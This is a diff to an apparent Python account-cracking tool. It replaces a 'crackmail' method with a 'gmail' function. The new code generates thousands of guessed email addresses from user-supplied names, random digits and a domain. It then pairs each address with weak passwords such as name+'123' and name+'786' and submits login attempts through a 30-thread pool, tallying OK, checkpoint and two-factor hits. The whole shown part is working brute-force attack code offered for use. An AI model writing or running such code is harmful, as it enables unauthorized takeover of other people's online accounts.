@@ -406,39 +406,61 @@ class crack_main():
                 except FileNotFoundError:
                         print(' No file found ....')
                         exit()
-        def crackmail(self,id):
-                global methods
-                os.system("clear");print(logo)
-                import requests,random
-                user=[]
-                passlist = []
-                print(50*'=')
-                print(" [*] First Name Example ahmad,arsalan")
-                print(50*'=')
-                first = input(" First Name : ")
-                print(50*'=')
-                print(" [*] Last Name Example ali,arshad")
-                print(50*'=')
-                last = input(" Last Name : ")
-                print(50*'=')
-                print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
-                print(50*'=')
-                domain = input(" Domain : ")
-                print(50*'=')
-                print("\n [?] Limit ids Example 1000,5000,50000")
-                print(50*'=')
+        def gmail():
+                os.system('rm -rf .re.txt')
+                clear()
+                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
+                linex()
+                first = input(' Put first name: ')
+                linex()
+                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
+                linex()
+                last = input(' Put last name: ')
+                linex()
+                print(' Example: @gmail.com , @yahoo.com etc...')
+                linex()
+                domain = input(' domain: ')
+                linex()
                 try:
                         limit=int(input(' Put limit: '))
                 except ValueError:
                         limit = 5000
-                print(50*'=')
+                linex()
                 print(' Getting gmails...')
-                for nmbr in range(limit):
-                        nmpp = random.randint(99,9999)
-                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
-                        naseeb = open('mail.txt','a').write(nmp)
-                self.id = open('mail.txt').read().splitlines()
-                self.pasw()
+                lists = ['3','4']
+                for xd in range(limit):
+                        lchoice = random.choice(lists)
+                        if '3' in lchoice:
+                                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        else:
+                                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        fo = open('mail.txt', 'r').read().splitlines()
+                with tred(max_workers=30) as Aking:
+                        total = str(len(fo))
+                        clear()
+                        print(' Total account : \033[1;32m'+total)
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        linex()
+                        for user in fo:
+                                ids,names = user.split('|')
+                                first_name = names.rsplit(' ')[0]
+                                try:
+                                        last_name = names.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                Aking.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' The process has completed')
+                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
+                linex()
+                input(' Press enter to back ')
+                os.system('python zia.py')
         def cracknum(self,id):
                 global methods
                 os.system('clear');print(logo)
